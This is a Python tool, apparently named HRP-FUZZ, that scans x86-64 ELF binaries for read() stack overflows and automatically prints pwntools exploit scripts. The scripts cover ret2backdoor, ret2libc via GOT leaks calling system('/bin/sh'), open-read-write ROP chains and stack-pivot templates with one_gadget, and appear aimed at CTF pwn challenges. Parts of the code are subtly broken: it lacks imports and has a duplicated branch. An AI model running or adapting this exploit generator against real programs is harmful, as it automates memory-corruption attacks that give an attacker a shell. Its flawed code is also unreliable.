# encoding=utf-8
# 导入主要函数库
from pwn import *
import pwnlib
import numpy as np
import os
import sys
import logging
import fuzz2
import fuzz
# 初始化设置为debug模式和设置elf架构
context(os='linux', arch='amd64')

# 自定义审查函数名
Function_Name = {}  # key是函数名，value是函数地址
# 定义call字典
Call_list = {}  # Call_list的key是call 调用点，value是被调用函数的地址
# 定义主函数地址
main_addr = 0
# 用户自定义函数判断被call判断字典
User_Function = {}
# 读取自定义审查函数文件


def loads_function_list():
    try:
        with open('./function_list', 'r') as f:
            for line in f:
                line = line.replace('\n', '')
                Function_Name[line] = 0
    except Exception as e:
        print(e)
        exit(1)


# 利用pwntools获取elf文件中的程序地址
printogram_base = 0


def get_addr(elf, file_os):  # 用pwntools搜素我们需要的库函数，如果是Ubuntu20需要进行-4定位到真正在汇编中的调用地址
    # 程序基地址
    global printogram_base
    printogram_base = elf.address
    print(('[+]printogram_base:' + hex(printogram_base)))
    global eh_frame_addr
    eh_frame_addr = elf.get_section_by_name('.eh_frame').header.sh_addr
    global start_offset
    start_offset = elf.header.e_entry
    offset = elf.read(start_offset, 0x40).find(b'\x48\xc7\xc7')  # mov rdi,?
    global main_addr
    main_addr = u32(elf.read(start_offset + offset + 3, 4))
    print(('[+]eh_frame_addr:' + hex(eh_frame_addr)))
    print(('[+]start_offset:' + hex(start_offset)))
    print(('[+]main_addr:' + hex(main_addr)))
    print("")
    for item in list(Function_Name.keys()):
        try:
            # 查询Ubuntu18
            if file_os == 18:
                Function_Name[item] = (elf.sym[item])
                print(("[+]Found " + str(item) +
                      " address:" + hex(Function_Name[item])))
            # 查询Ubuntu20-22编译的程序地址-4
            if file_os == 20:
                Function_Name[item] = (elf.sym[item]) - 4
                print(("[+]Found " + str(item) +
                      " address:" + hex(Function_Name[item])))
        except Exception as e:
            # 找不到就弹出这个字典
            Function_Name.pop(item)

# 查找都call了哪些函数


def search_call_what(elf, file_name, argv):
    cmd = os.popen("strings ./" + file_name + " | grep GCC")
    found_file_os = cmd.read()  # 利用管道获取GCC查询结果获取系统版本
    print(("[+]Found file_os ing..." + found_file_os))
    # 个人目前总结分析，glibc2.23-2.27 2.31-2.35分2大类特征
    if "18.04" in found_file_os:
        file_os = 18
        os_16_flag = 0
    elif "16.04" in found_file_os:
        file_os = 18
        os_16_flag = 1
    elif "20.04" in found_file_os:
        file_os = 20
        os_16_flag = 0
    elif "20.04" in found_file_os:
        file_os = 20
        os_16_flag = 0
    elif "22.04" in found_file_os:
        file_os = 20
        os_16_flag = 0
    else:
        print(
            "[+]MAYBE YOU BUILD YOUR BINARY IN OTHER OS,BUT WE DO NOT SUPPORT TO CHECK IT ,SORRY!")
        exit(0)
    get_addr(elf, file_os)
    print("")
    # print("Finding Call")
    # 利用pwntools查询call指令的机器码字节E8
    call = elf.search(b'\xE8')
    # 利用numpy把list变成array
    call_addr = np.array(list(call))
    # 计算长度
    call_len = len(call_addr)
    # 获取相对地址
    for i in range(call_len):
        # 获取call xx中xx到这条call指令的相对地址
        Relative_address = (
            u64(elf.read(int(call_addr[i]), 5)[1:5].ljust(8, b'\x00')))
        # 地址总和上限就是0xffffffff，还要减去操作数据(也就是相对地址)的站位长度
        Relative_len = 0xffffffff - Relative_address - 4
        for item in list(Function_Name.keys()):
            # 获取库函数在ELF的地址
            tmp_addr = Function_Name[item]
            # 如果plt地址+正相对地址等于call指令地址 则判断为call plt
            maybe_addr = tmp_addr + Relative_len
            if (maybe_addr == call_addr[i]):
                Call_list[call_addr[i]] = item

    # 获取所有用户定义的函数头和尾
    get_all_user_func(elf, file_name, file_os)

    # 上面的没做完善，只是进行了审查列表的求解，下面是所有call xx的求解
    for i in call_addr:
        # 截取相对地址最后一位判断正负
        plus_minus = (u64(elf.read(int(i), 5)[4:5].ljust(8, b'\x00')))
        if plus_minus == 0xff:
            Relative_address = (
                u64(elf.read(int(i), 5)[1:5].ljust(8, b'\x00')))
            Relative_len = 0xffffffff - Relative_address - 4
            for item in list(User_Function.keys()):
                tmp_addr = item
                maybe_addr = tmp_addr + Relative_len
                if (maybe_addr == i):
                    Call_list[i] = item
        else:
            Relative_address = (
                u64(elf.read(int(i), 5)[1:5].ljust(8, b'\x00')))
            Relative_len = Relative_address
            for item in list(User_Function.keys()):
                maybe_addr = Relative_len + i + 5
                if (maybe_addr == item):
                    Call_list[i] = item
    # 打印call列表
    for item in list(Call_list.keys()):
        # print("[+] "+hex(item)+" call:"),
        if isinstance(Call_list[item], str):
            pass
            # print((Call_list[item]))
        else:
            pass
            # print(hex(Call_list[item]))

        # 这个函数非常重要，是寻找所有的call所属的函数定位
        Hierarchical = Hierarchical_call_lookup(item, file_os)
        # print("[+] "+hex(item)+" Hierarchical call:"+hex(Hierarchical))
        # print("")

    # 这个的实现主要是补全callback功能 使得用户可以从函数头和call调用点去层层回调找到调用链
    for item in User_Function:
        Hierarchical_function_lookup(item, file_os)

    try:
        if argv[2] == "--callback":
            print("[+]自动化路径如下（main->addr）:")
            addr = int(argv[3], 16)
            addrs = np.int64(addr)
            recursive_search_call_chain(addrs, [])
            for chains in chain:
                chains.reverse()
                for index in chains:
                    print(((hex(index))), end=' ')
                    if index == addrs:
                        print("")
                    else:
                        print((' -> '), end=' ')
            exit(0)
    except Exception as e:
        pass

    overturn_Hierarchical()
    solve_call(elf, file_name, file_os)


# 递归搜索调用链
chain = []
# Call_list的key是call 调用点，value是被调用函数的地址
# Hierarchical_list的key是push rbp也就是每个函数的头,value是call调用点
# 我们先从溢出点传入for循环查找到溢出点的rbp
# 然后把这个rbp假定为被别的函数调用了,让Call_list去for循环比对找到rbp的被调用点
# 如此循环往复，在到达默认深度结束以后就会给出完整的一条或者多条调用链
# 这个处理还是有小部分问题无法识别解决，我摆烂了


def recursive_search_call_chain(address, current_chain):
    try:
        for i in Hierarchical_list:
            for j in Hierarchical_list[i]:
                if j == address:
                    current_chain.append((i))
                    tmp = i
        for y in Call_list:
            a = Call_list[y]
            if isinstance(a, str):
                continue
            if a == tmp:
                recursive_search_call_chain(
                    y, current_chain)  # 递归调用，将当前的调用点添加到调用链中
                current_chain.pop()  # 从调用链中移除当前的调用点
        if main_addr in current_chain[:]:
            chain.append(current_chain[:])
    except Exception as e:
        print(e)
        print("无法探测调用链")
        exit(0)

    # raw_input()


# 定义全局层级调用字典
Hierarchical_list = defaultdict(list)


def Hierarchical_call_lookup(addr, file_os):
    tmp_list = []
    # search mov_rbp_rsp 把addr与最近的mov_rbp_rsp相加-x就可以得到该addr被哪个函数调用
    mov_rbp_rsp = elf.search(b'\x48\x89\xe5')
    mov_rbp_rsp_addr = np.array(list(mov_rbp_rsp))
    for address in mov_rbp_rsp_addr:
        sub = addr - address
        if sub > 0:
            tmp_list.append(sub)
    if file_os == 18:
        Hierarchical = addr - min(tmp_list) - 1
        # ubuntu20-22多了个endbr64 need sub 5
    else:
        Hierarchical = addr - min(tmp_list) - 5
    # Hierarchical_list[函数头]=call xxx
    Hierarchical_list[Hierarchical].append(addr)
    sorted(list(Hierarchical_list.keys()), reverse=True)
    return Hierarchical


def Hierarchical_function_lookup(addr, file_os):
    if file_os == 18:
        push_rbp = u32(elf.read(addr, 1).ljust(4, b'\x00'))
        # 0X55=PUSH RBP
        if push_rbp == 0x55:
            Hierarchical_list[addr].append(addr)
    elif file_os == 20:
        endbr64 = u32(elf.read(addr, 4).ljust(4, b'\x00'))
        # 0xFA1E0FF3=endbr64
        if endbr64 == 0xFA1E0FF3:
            Hierarchical_list[addr].append(addr)


overturn_Hierarchical_list = defaultdict(list)


def overturn_Hierarchical():
    for key, values in list(Hierarchical_list.items()):
        for value in values:
            overturn_Hierarchical_list[value].append(key)


def remove_non_alphanumeric_and_leading_zeros(s):
    sign = b'-' if s.startswith(b'-') else b''
    alphanumeric_str = re.sub(br'[^a-zA-Z0-9-+]', b'', s)
    leading_zeros_removed_str = re.sub(br'^[-+]?0+(?=\d|$)', b'', alphanumeric_str)
    return sign + leading_zeros_removed_str if (leading_zeros_removed_str and (sign or leading_zeros_removed_str != b'0')) else b'0'

# 获取read的rsi rdx，rsi获取是最近特征爆搜,rdx是大小数组差值特征


def solve_read(elf, addr, file_name, file_os):
    # 定义临时的列表存放read调用点和mov_edx__xx的差值
    tmp_list = []
    # find mov_edx_xx
    mov_edx_xx = elf.search(b'\xBA')
    mov_edx_xx_addr = np.array(list(mov_edx_xx))
    # Stack_migration_address (lea     rax, [rbp+buf])
    Stack_migration_address = 0
    for address in mov_edx_xx_addr:
        sub = addr - address
        if sub > 0:
            tmp_list.append(sub)
    # 找到最近的edx（也就是rdx）的赋值机器码必然就是当前read的赋值
    tmp_addr = addr - min(tmp_list)
    # 获取rdx
    rdx = u64(elf.read(tmp_addr, 5)[1:4].ljust(8, b'\x00'))
    print(("[+]rdx:" + hex(rdx)))
    # 获取rsi 检测两个特征
    tmp_chek = u32(elf.read(tmp_addr - 4, 3).ljust(4, b'\x00'))
    # 分大小数据，大于0x100和小于0x100的
    if tmp_chek == 0x458D48:
        rsi = 0x100 - u32(elf.read(tmp_addr - 4, 4)[3:4].ljust(4, b'\x00'))
        Stack_migration_address = tmp_addr - 4
    else:
        tmp_chek = u32(elf.read(tmp_addr - 7, 3).ljust(4, b'\x00'))
        if tmp_chek == 0x858D48:
            rsi = 0x100000000 - \
                u64(elf.read(tmp_addr - 7, 7)[3:].ljust(8, b'\x00'))
            Stack_migration_address = tmp_addr - 7
    print(("[+]rsi:" + hex(rsi)))
    # rsi<rdx判断为栈溢出交由栈溢出判断函数
    if rsi < rdx:
        overturn_Call_list = dict(
            list(zip(list(Call_list.values()), list(Call_list.keys()))))
        recursive_search_call_chain(addr, [])
        if len(chain) > 0:
            print("[+]自动化探索可行路径如下:")
            # 倒转全局链，从main到溢出点
            for chains in chain:
                # 逆序调用链从mian到overflow
                chains.reverse()
                for index in chains:
                    print(((hex(index))), end=' ')
                    if index == overturn_Hierarchical_list[addr][0]:
                        print("")
                    else:
                        print((' -> '), end=' ')
            # angr符号执行分析链上所有点位的进入逻辑
            if auto_flag:
                for index in chain:
                    for i in range(1, len(index)):
                        start_addr = index[i - 1]
                        end_addr = User_Function[index[i - 1]]
                        target_addr = overturn_Call_list[index[i]]
                        if mode == '2':
                            auto_pwn_result_list.append(
                                fuzz2.find_input_strings(
                                    file_name,
                                    int(start_addr),
                                    int(end_addr),
                                    int(target_addr),
                                    1024,file_os))
                            auto_pwn_result_list.append(fuzz2.find_input_strings(file_name, int(overturn_Hierarchical_list[addr][0]), int(
                                User_Function[overturn_Hierarchical_list[addr][0]]), int(addr), 1024,file_os))
                        elif mode == '1':
                            auto_pwn_result_list.append(
                                fuzz.find_input_strings(
                                    file_name,
                                    int(start_addr),
                                    int(end_addr),
                                    int(target_addr),
                                    1024,file_os))
                            auto_pwn_result_list.append(fuzz.find_input_strings(file_name, int(overturn_Hierarchical_list[addr][0]), int(
                                User_Function[overturn_Hierarchical_list[addr][0]]), int(addr), 1024,file_os))
                        global auto_pwn_result_list_fix
                        auto_pwn_result_list_fix = [
                            x for sublist in auto_pwn_result_list for x in sublist if x != b'']
                        auto_pwn_result_list_fix = [
                            x for item in auto_pwn_result_list_fix for x in (
                                item if isinstance(
                                    item, list) else [item])]
                        print("[+]All need:", auto_pwn_result_list_fix)
                        auto_success = True
                # 优化特殊结果:such as -0+0066556
                auto_pwn_result_list_fix = [remove_non_alphanumeric_and_leading_zeros(
                    item) for item in auto_pwn_result_list_fix]
                print(auto_pwn_result_list_fix)
                solve_read_overflow(
                    addr,
                    rsi,
                    rdx,
                    file_name,
                    file_os,
                    Stack_migration_address,
                    auto_success,
                    remote)
            else:
                auto_success = False
                solve_read_overflow(
                    addr,
                    rsi,
                    rdx,
                    file_name,
                    file_os,
                    Stack_migration_address,
                    auto_success,
                    remote)
        else:
            print("[+]路径探索失败,但是我依然可以给你提供参考EXP!")
            auto_success = False
            # 生成模板
            solve_read_overflow(
                addr,
                rsi,
                rdx,
                file_name,
                file_os,
                Stack_migration_address,
                auto_success,
                remote)


def solve_read_overflow(
        addr,
        rsi,
        rdx,
        file_name,
        file_os,
        Stack_migration_address,
        auto_success,
        remote):
    system = False
    system_be_called = []
    sub = rdx - rsi
    strs = ''
    elf = ELF(file_name)
    # 最基础的rop链构造puts(got)ret2libc&ret2backdoor
    if sub > 0x28:
        # 翻转call_list 查询system的调用点
        # Hierarchical_list的key和value分别是call地址和这个call所属最近函数
        # call_list的key和value分别是call地址和函数名
        # 通过翻转代入到Hierarchical_list可以得知system的最近所属也就是后门地址
        # strs_addr是执行内容，直接用机器码距离特征加相对地址计算解决
        overturn_Call_list = dict(
            list(zip(list(Call_list.values()), list(Call_list.keys()))))
        for function in list(overturn_Call_list.keys()):
            if function == 'system':
                system = True
                system_be_called.append(
                    Hierarchical_list[overturn_Call_list[function]])
                strs_addr = u64(elf.read(overturn_Call_list[function] - 7, 7)[
                                3:].ljust(8, b'\x00')) + (overturn_Call_list[function])
                strs = elf.read(strs_addr, 0x10).split('\x00')
            elif function == 'execve':
                system = True
                system_be_called.append(
                    Hierarchical_list[overturn_Call_list[function]])
        # ret2backdoor exp
        if system:
            for i in range(len(system_be_called)):
                print(("[+]Found system(execve) be called by function:" +
                       hex(system_be_called[i]) +
                       " and system(xx) is " +
                       str(strs[0])))
                if i == 0:
                    print("[+]Now i will give u an easy exp about ret2backdoor")
                    print("")
                    # ubuntu18 need add one return to Stack balancing
                    if elf.canary == False and elf.pie != True:
                        ret = next(elf.search(asm("ret")))

                        print("#encoding=utf-8")
                        if file_os:
                            print("#如果是Ubuntu20-22下的system利用其中的ret看具体情况要不要去掉")
                        print("from pwn import *")
                        print("context(log_level='debug',arch='amd64')")
                        print(("elf=ELF(" + "'" + file_name + "'" + ")"))
                        print(("r=process(" + "'" + file_name + "'" + ")"))
                        with open('output.txt', 'w') as f:
                            if remote=='remote':
                                sys.stdout = f
                            if auto_success:
                                for i in auto_pwn_result_list_fix:
                                    print("r.recv(timeout=1)")
                                    print("r.sendline(" + str(i) + ")")
                            print(("payload=" + "b'a'*" + hex(rsi + 8) + "+p64(" +
                                  hex(ret) + ")" + "+p64(" + hex(system_be_called[i]) + ")"))
                            print("r.send(payload)")
                            print("r.sendline('cat flag')")
                            print("r.interactive()")
                            exit(0)
                    elif elf.canary and elf.pie != True:
                        ret = next(elf.search(asm("ret")))
                        print("#encoding=utf-8")
                        if file_os:
                            print("#如果是Ubuntu20-22下的system利用其中的ret看具体情况要不要去掉")
                        print("from pwn import *")
                        print("context(log_level='debug',arch='amd64')")
                        print(("elf=ELF(" + "'" + file_name + "'" + ")"))
                        print("#由于canary可能涉及复杂逻辑，需要用户自行泄露，模板只帮计算溢出模板")
                        print(("r=process(" + "'" + file_name + "'" + ")"))
                        with open('output.txt', 'w') as f:
                            if remote=='remote':
                                sys.stdout = f
                            if auto_success:
                                for i in auto_pwn_result_list_fix:
                                    print("r.recv(timeout=1)")
                                    print("r.sendline(" + str(i) + ")")
                            print(("payload=" +
                                   "b'a'*" +
                                   hex(rsi -
                                       8) +
                                   "+p64(canary)+b'a'*8" +
                                   "+p64(" +
                                   hex(ret) +
                                   ")" +
                                   "+p64(" +
                                   hex(system_be_called[i]) +
                                   ")"))
                            print("r.send(payload)")
                            print("r.sendline('cat flag')")
                            print("r.interactive()")
                            exit(0)
        # ret2libc & orw
        if not system:
            print("[+]Now i will give u two exp about orw or system getshell")
            print("")
            if not elf.pie:
                rdi = next(elf.search(asm("pop rdi;ret")))
                pop_rsi_r15_ret = next(elf.search(asm("pop rsi;pop r15;ret")))
                ret = next(elf.search(asm("ret")))
                bss_addr = elf.get_section_by_name('.bss').header.sh_addr

                print("#encoding=utf-8")
                print("#canary涉及相关的逻辑操作，若有canary请自己泄露")
                if file_os == 20:
                    print("#如果是Ubuntu20-22下的system利用其中的ret看具体情况要不要去掉")
                print("#ubuntu-18 ret2libc system or orw")
                print("from pwn import *")
                print("context(log_level='debug',arch='amd64')")
                print(("elf=ELF(" + "'" + file_name + "'" + ")"))
                print("libc=elf.libc")
                print(("r=process(" + "'" + file_name + "'" + ")"))
                with open('output.txt', 'w') as f:
                    if remote =='remote':
                        sys.stdout = f
                    print("r.recv(timeout=1)")
                    print(("rdi=" + hex(rdi)))
                    print("rdx=next(libc.search(asm('pop rdx;ret')))")
                    print(("pop_rsi_r15_ret=" + hex(pop_rsi_r15_ret)))
                    print(("ret=" + hex(ret)))
                    print(("Hierarchical=" +
                           hex(overturn_Hierarchical_list[addr][0])))
                    if auto_success:
                        for i in auto_pwn_result_list_fix:
                            print("r.recv(timeout=1)")
                            print("r.sendline(" + str(i) + ")")
                    if 'puts' in Function_Name:
                        print("puts_got=elf.got['puts']")
                        print("puts_plt=elf.plt['puts']")
                        if elf.canary:
                            print(("payload=b'a'*" + hex(rsi - 8) +
                                  "+p64(canary)+b'a'*8+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(Hierarchical)"))
                        else:
                            print(("payload=b'a'*" + hex(rsi + 8) +
                                  "+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(Hierarchical)"))
                        print("r.send(payload)")
                        print(
                            "leak=u64(r.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))")
                        print("base=leak-libc.sym['puts']")
                    elif 'write' in Function_Name and 'puts' not in Function_Name:
                        print("write_got=elf.got['write']")
                        print("write_plt=elf.plt['write']")
                        if elf.canary:
                            print(("payload=b'a'*" + hex(rsi - 8) +
                                  "+p64(canary)+b'a'*8+p64(rdi)+p64(1)+p64(pop_rsi_r15_ret)+p64(write_got)+p64(0)+p64(write_plt)+p64(Hierarchical)"))
                        else:
                            print(("payload=b'a'*" + hex(rsi + 8) +
                                  "+p64(rdi)+p64(1)+p64(pop_rsi_r15_ret)+p64(write_got)+p64(0)+p64(write_plt)+p64(Hierarchical)"))
                        print("r.send(payload)")
                        print(
                            "leak=u64(r.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))")
                        print("base=leak-libc.sym['write']")
                    if 'prctl' not in Function_Name:
                        print("sh=base+next(libc.search(b'/bin/sh'))")
                        print("system=base+libc.sym['system']")
                        if elf.canary:
                            print(("payload2=b'a'*" + hex(rsi - 8) +
                                  "+p64(canary)+b'a'*8+p64(rdi)+p64(sh)+p64(ret)+p64(system)+p64(Hierarchical)"))
                        else:
                            print(("payload2=b'a'*" + hex(rsi + 8) +
                                  "+p64(rdi)+p64(sh)+p64(ret)+p64(system)+p64(Hierarchical)"))
                        print("r.send(payload2)")
                    elif 'prctl' in Function_Name:
                        print("the_open=base+libc.sym['open']")
                        print("the_write=base+libc.sym['write']")
                        print("the_read=base+libc.sym['read']")
                        print(("bss=" + hex(bss_addr + 0x300)))
                        print("rdx=base+rdx")
                        if elf.canary:
                            print(("payload2=b'a'*" + hex(rsi - 8) +
                                  "+p64(canary)+b'a'*8+p64(rdi)+p64(0)+p64(pop_rsi_r15_ret)+p64(bss)+p64(0)+p64(rdx)+p64(0x200)+p64(the_read)+p64(Hierarchical)"))
                        else:
                            print(("payload2=b'a'*" + hex(rsi + 8) +
                                  "+p64(rdi)+p64(0)+p64(pop_rsi_r15_ret)+p64(bss)+p64(0)+p64(rdx)+p64(0x200)+p64(the_read)+p64(Hierarchical)"))
                        print("r.send(payload2)")
                        print("sleep(1)")
                        print("r.send('flag\x00/')")
                        if elf.canary:
                            print(("payload3=b'a'*" + hex(rsi - 8) +
                                  "+p64(canary)+b'a'*8+p64(rdi)+p64(bss)+p64(pop_rsi_r15_ret)+p64(0664)+p64(0)+p64(the_open)"))
                        else:
                            print(("payload3=b'a'*" + hex(rsi + 8) +
                                  "+p64(rdi)+p64(bss)+p64(pop_rsi_r15_ret)+p64(0664)+p64(0)+p64(the_open)"))
                        print(
                            "payload3+=p64(rdi)+p64(3)+p64(pop_rsi_r15_ret)+p64(bss)+p64(0)+p64(rdx)+p64(0x200)+p64(the_read)")
                        print(
                            "payload3+=p64(rdi)+p64(1)+p64(pop_rsi_r15_ret)+p64(bss)+p64(0)+p64(the_write)")
                        print("r.send(payload3)")
                    print("r.sendline('cat flag')")
                    print("r.interactive()")
                    exit(0)
    if sub == 0x10:
        rdi = next(elf.search(asm("pop rdi;ret")))
        pop_rsi_r15_ret = next(elf.search(asm("pop rsi;pop r15;ret")))
        ret = next(elf.search(asm("ret")))
        bss_addr = elf.get_section_by_name('.bss').header.sh_addr

        print("#encoding=utf-8")
        print("#开始生成栈迁移模板")
        print("#canary涉及相关的逻辑操作，若有canary请自己泄露")
        if file_os == 20:
            print("#如果是Ubuntu20-22下的system利用其中的ret看具体情况要不要去掉")
        print("#ubuntu-18 ret2libc system or orw")
        print("from pwn import *")
        print("context(log_level='debug',arch='amd64')")
        print(("elf=ELF(" + "'" + file_name + "'" + ")"))
        print("libc=elf.libc")
        print(("r=process(" + "'" + file_name + "'" + ")"))
        with open('output.txt', 'w') as f:
            if remote=='remote':
                sys.stdout = f
            print("r.recv(timeout=1)")
            print(("rdi=" + hex(rdi)))
            print("rdx=next(libc.search(asm('pop rdx;ret')))")
            print(("pop_rsi_r15_ret=" + hex(pop_rsi_r15_ret)))
            print(("ret=" + hex(ret)))
            print(("Hierarchical=" + hex(overturn_Hierarchical_list[addr][0])))
            print(("Stack_migration_address=" + hex(Stack_migration_address)))
            print(("bss=" + hex(bss_addr)))
            print(("offset=" + hex(rsi)))
            if auto_success:
                for i in auto_pwn_result_list_fix:
                    if len(i) > 0:
                        for j in i:
                            print("r.recv(timeout=1)")
                            print("r.sendline(" + str(j) + ")")
            if 'puts' in Function_Name:
                print("puts_got=elf.got['puts']")
                print("puts_plt=elf.plt['puts']")
                print(("payload=b'a'*" + hex(rsi) +
                      "+p64(bss+0x300)+p64(Stack_migration_address)"))
                print("r.send(payload)")
                print("sleep(1)")
                print(("payload=b'a'*" + hex(rsi) +
                      "+p64(bss+0x300+offset)+p64(Stack_migration_address)"))
                print("r.send(payload)")
                print("sleep(1)")
                print(
                    "payload2=p64(bss+0x300+offset+0x10)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(Stack_migration_address)")
                print("r.send(payload2)")
                print("sleep(1)")
                print("leak=u64(r.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))")
                print("base=leak-libc.sym['puts']")
                print("print('[+]base:'+hex(base))")
                print("'''")
                print("#onegadget自己选择，我这里会提供非常多的onegadget")
                cmd = os.popen("one_gadget " +
                               str(elf.libc).split("'")[1] +
                               " --level 1")
                onegadgets = cmd.read()  # 利用管道获取onegadgets
                print(onegadgets)
                print("'''")
                print("one=base+your_choice_onegadget")
                print("payload3=p64(0)*4+p64(one)")
                print("r.send(payload3)")
                print("r.sendline('cat flag')")
                print("r.interactive()")
                exit(1)


def solve_call(elf, file_name, file_os):
    for call_addr in list(Call_list.keys()):
        call_what = Call_list[call_addr]
        if str(call_what) == 'read':
            solve_read(elf, call_addr, file_name, file_os)


# 查找用户编写的函数
def get_all_user_func(elf, file_name, file_os):
    # Ubuntu18 函数头是push rbp
    if file_os == 18:
        tmp_sub = []
        push_rbp = elf.search(asm("push rbp;"))
        push_rbp_addr = np.array(list(push_rbp))
        leave_ret = elf.search(asm("leave;ret;"))
        pop_rbp_ret = elf.search(asm("pop rbp;ret;"))
        pop_rbp_ret_list = np.array(list(pop_rbp_ret))
        leave_ret_list = np.array(list(leave_ret))
        ret_addr = np.concatenate([pop_rbp_ret_list, leave_ret_list])
        if file_os == 18:
            for i in push_rbp_addr:
                for j in ret_addr:
                    a = int(j - i)
                    if a > 0:
                        tmp_sub.append(a)
                # 查询获取的头上面是不是ret，或者jmp(第一个函数的头前面是jmp，其他的都是ret)
                if tmp_sub:
                    check = u32(elf.read(i - 1, 1).ljust(4, b'\x00'))
                    check1 = u32(elf.read(i - 2, 1).ljust(4, b'\x00'))
                    # 如果是，则把最近的尾做为字典的value，头做key
                    if check == 0xC3 or check1 == 0xEB:
                        User_Function[i] = min(tmp_sub) + i + 1
                    # 清空临时差值列表
                    tmp_sub = []

    # Ubuntu20的开头是这个endbr64，其他原来一模一样的
    else:
        tmp_sub = []
        push_rbp = elf.search(asm("endbr64;"))
        push_rbp_addr = np.array(list(push_rbp))
        leave_ret = elf.search(asm("leave;ret;"))
        pop_rbp_ret = elf.search(asm("pop rbp;ret;"))
        pop_rbp_ret_list = np.array(list(pop_rbp_ret))
        leave_ret_list = np.array(list(leave_ret))
        ret_addr = np.concatenate([pop_rbp_ret_list, leave_ret_list])
        if file_os == 20:
            for i in push_rbp_addr:
                for j in ret_addr:
                    a = int(j - i)
                    if a > 0:
                        tmp_sub.append(a)
                # 查询获取的头上面是不是ret，或者jmp(第一个函数的头前面是jmp，其他的都是ret)
                if tmp_sub:
                    check = u32(elf.read(i - 1, 1).ljust(4, b'\x00'))
                    check1 = u32(elf.read(i - 2, 1).ljust(4, b'\x00'))
                    # 如果是，则把最近的尾做为字典的value，头做key
                    if check == 0xC3 or check1 == 0xEB:
                        User_Function[i] = min(tmp_sub) + i
                    # 清空临时差值列表
                    tmp_sub = []


def banner():
    banner = '''
 ████████ ██     ██ ████████ ████████
░██░░░░░ ░██    ░██░░░░░░██ ░░░░░░██
░██      ░██    ░██     ██       ██
░███████ ░██    ░██    ██       ██
░██░░░░  ░██    ░██   ██       ██
░██      ░██    ░██  ██       ██
░██      ░░███████  ████████ ████████
░░        ░░░░░░░  ░░░░░░░░ ░░░░░░░░

                                            ——Powered By HRP

  '''
    print(banner)


start_address = 0
end_address = 0
auto_flag = False
auto_success = False
auto = ""
auto_pwn_result_list = []
auto_pwn_result_list_fix = []
remote = ''
mode = ''
if __name__ == '__main__':
    banner()
    # 设置日志级别为 WARNING，以减少输出
    logging.disable(logging.WARNING)

    loads_function_list()

    if len(sys.argv) < 2:
        print("[+]please input file name!")
        exit(0)
    try:
        file_name = sys.argv[1]  # 外部获取文件名
        try:
            auto = sys.argv[2]
            remote = sys.argv[3]
            mode = sys.argv[4]
        except BaseException:
            auto_flag = False
        if auto == "auto":
            auto_flag = True
            print(auto_flag)
        if remote == "remote":
            remote ='remote'
        elf = ELF(file_name)
        start_address = elf.get_section_by_name('.text').header.sh_addr
        end_address = start_address + \
            elf.get_section_by_name('.text').header.sh_size
        if elf.arch == 'i386':
            print("[+]WE DO NOT SUPPORT I386 BINARY!")
            exit(0)
    except Exception as e:
        print("[+]Usage:python3 HRP-FUZZ-2.0.py ./filepath <auto> <remote/local> <mode>")
    else:
        canary = elf.canary
        search_call_what(elf, file_name, sys.argv)
    finally:
        pass